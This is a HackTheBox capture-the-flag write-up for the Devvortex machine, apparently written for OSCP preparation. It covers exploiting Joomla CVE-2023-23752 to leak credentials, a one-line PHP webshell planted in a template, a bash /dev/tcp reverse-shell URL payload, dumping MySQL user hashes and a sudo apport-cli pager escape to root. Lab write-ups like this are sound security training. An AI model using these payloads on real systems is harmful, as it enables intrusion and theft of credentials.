+++
date = '2026-05-16T00:00:00-03:00'
draft = false
title = 'HTB: Devvortex - OSCP Prep Write-up'
tags = ['htb', 'oscp', 'lain-kusanagi', 'write-up', 'linux', 'web', 'joomla', 'cve-2023-23752', 'subdomain-enumeration', 'template-injection', 'mysql', 'gtfobins', 'apport-cli']
description = 'Write-up for HackTheBox Devvortex - subdomain discovery leading to a Joomla 4.2.6 instance vulnerable to CVE-2023-23752, leaking credentials through the public API, gaining RCE via template editing, and escaping to root through an apport-cli GTFOBins pager trick.'
ShowToc = true
TocOpen = false
[cover]
image = 'images/htb-devvortex/cover.png'
+++

Directory brute-force gets you nowhere on Devvortex. The win is one layer up - in the subdomains.

## Machine info

| | |
|---|---|
| **Name** | Devvortex |
| **Platform** | HackTheBox |
| **OS** | Linux |
| **Difficulty** | Easy |

## TL;DR

- Subdomain enumeration reveals `dev.devvortex.htb`, running Joomla 4.2.6
- joomscan identifies the exact version; CVE-2023-23752 leaks usernames and the admin password via unauthenticated REST API endpoints
- Log in as lewis, edit the active Cassiopeia template to plant a PHP webshell, get a shell as `www-data`
- `configuration.php` re-exposes the MySQL password; query the `sd4fg_users` table and crack logan's bcrypt hash with John
- `su logan`, check sudo: `(ALL:ALL) /usr/bin/apport-cli` - escape through the less pager to root

---

## Recon

### Nmap

```bash
nmap -sV -sC -Pn -A devvortex.htb
```

![Nmap results](/images/htb-devvortex/nmap.png)

Ports 22 (SSH) and 80 (HTTP). nginx 1.18.0 on Ubuntu.

---

## Enumeration

### Initial directory brute-force

```bash
gobuster dir -u http://devvortex.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
```

Nothing interesting on the root domain. Time to go wider.

### Subdomain enumeration

```bash
gobuster vhost -u http://devvortex.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

![Gobuster vhost](/images/htb-devvortex/gobuster-vhost.png)

`dev.devvortex.htb` responds with 200. Added it to `/etc/hosts` and moved on.

### Directory brute-force on the dev subdomain

```bash
gobuster dir -u http://dev.devvortex.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
```

![Gobuster dir dev](/images/htb-devvortex/gobuster-dir-dev.png)

Joomla all over the place - `/modules`, `/templates`, `/components`, `/administrator`. Classic fingerprint.

### Joomla admin panel

Navigating straight to `/administrator` - of course that's where you go first.

![Joomla admin login](/images/htb-devvortex/joomla-admin-login.png)

### Version detection with joomscan

```bash
joomscan -u http://dev.devvortex.htb
```

![joomscan version](/images/htb-devvortex/joomscan-version.png)

**Joomla 4.2.6**. A quick search turns up CVE-2023-23752 - unauthenticated information disclosure through the Joomla REST API. Two endpoints leak everything we need.

---

## Foothold

### CVE-2023-23752 - user and config disclosure

**User enumeration:**

![CVE users endpoint](/images/htb-devvortex/cve-users-endpoint.png)

```
http://dev.devvortex.htb/api/index.php/v1/users?public=true
```

Two users: `lewis` (Super User) and `logan paul` (Registered).

**Configuration leak:**

![CVE config endpoint](/images/htb-devvortex/cve-config-endpoint.png)

```
http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
```

The config endpoint dumps the application settings including the database user (`lewis`) and password: `P4ntherg0t1n5r3c0n##`.

**Why this works:** Joomla 4.0.0 through 4.2.7 exposes these REST API endpoints without authentication. The `?public=true` parameter is supposed to filter results, but the access control check was completely broken for these routes - it bypasses the authentication requirement entirely, exposing sensitive internal data to anyone who knows the URL.

### Joomla admin login as lewis

Back to the admin login. `lewis` / `P4ntherg0t1n5r3c0n##` - in on the first try.

### Template webshell

With admin access, the fastest path to RCE in Joomla is editing a PHP template file. Navigate to **System > Site Templates > Cassiopeia Details and Files**, open `error.php`, and drop in a webshell:

![Template webshell](/images/htb-devvortex/template-webshell.png)

```php
<?php system($_GET["cmd"]);?>
```

Save. Then hit the file directly:

![RCE browser](/images/htb-devvortex/rce-browser.png)

```
http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=id
```

`uid=33(www-data)` - RCE confirmed.

### Reverse shell

Set up a netcat listener on port 4444 and trigger a reverse shell through the webshell using a URL-encoded bash payload:

```bash
http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.X/4444+0>%261'
```

![Shell www-data](/images/htb-devvortex/shell-www-data.png)

Shell as `www-data@devvortex`.

---

## Privilege Escalation

### MySQL credentials from configuration.php

```bash
cat /var/www/dev.devvortex.htb/configuration.php
```

![configuration.php](/images/htb-devvortex/configuration-php.png)

DB creds: user `lewis`, password `P4ntherg0t1n5r3c0n##`, database `joomla`, type `mysqli`. Same password as the Joomla admin account.

### Querying the users table

Upgrade the shell first:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then connect to MySQL and find the user hashes:

![MySQL connect](/images/htb-devvortex/mysql-connect.png)

```bash
mysql -u lewis -p'P4ntherg0t1n5r3c0n##' -D joomla
```

![MySQL hashes](/images/htb-devvortex/mysql-hashes.png)

```sql
select name,password from sd4fg_users;
```

Two bcrypt hashes - lewis and logan paul. Logan's is the target.

### Cracking logan's hash

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![John cracked](/images/htb-devvortex/john-cracked.png)

Password: **tequieromucho**.

### Lateral move to logan

![su logan user flag](/images/htb-devvortex/su-logan-user-flag.png)

User flag captured.

### sudo -l

![sudo -l](/images/htb-devvortex/sudo-l.png)

```
(ALL : ALL) /usr/bin/apport-cli
```

Logan can run `apport-cli` as root.

### apport-cli pager escape

```bash
sudo apport-cli -f
```

`apport-cli` is Ubuntu's crash reporter. When run interactively, it pages through the report using `less`. Since the process was spawned via `sudo`, the entire process tree - including `less` - runs as root. The `less` pager supports shell escapes through the `!` operator, which spawns a child process inheriting the current user context. In this case, that context is root:

```
!/bin/bash
```

![Root shell](/images/htb-devvortex/root-shell.png)

**Root.**

---

## Takeaways

- **Subdomains expand the attack surface significantly.** A dead-end on the root domain doesn't mean it's over - always enumerate vhosts and subdomains before giving up.
- **CVE-2023-23752 is a low-effort, high-reward check on any Joomla target.** Versions 4.0.0 to 4.2.7 are affected; hitting two unauthenticated API endpoints hands you usernames and plaintext credentials.
- **Joomla template editing equals direct code execution.** Any admin with template edit permissions can run arbitrary PHP. Lock this down in production.
- **Any sudo-invoked pager is a shell escape.** apport-cli, man, git log, and many others open `less` - and `less` runs `!command` as the invoking user. If that user is root, you have root.

## References

- [HackTheBox - Devvortex](https://app.hackthebox.com/machines/Devvortex)
- [CVE-2023-23752 - Joomla Unauthenticated Info Disclosure](https://nvd.nist.gov/vuln/detail/CVE-2023-23752)
- [GTFOBins - apport-cli](https://gtfobins.github.io/gtfobins/apport-cli/)
- Lain Kusanagi list (OSCP prep)
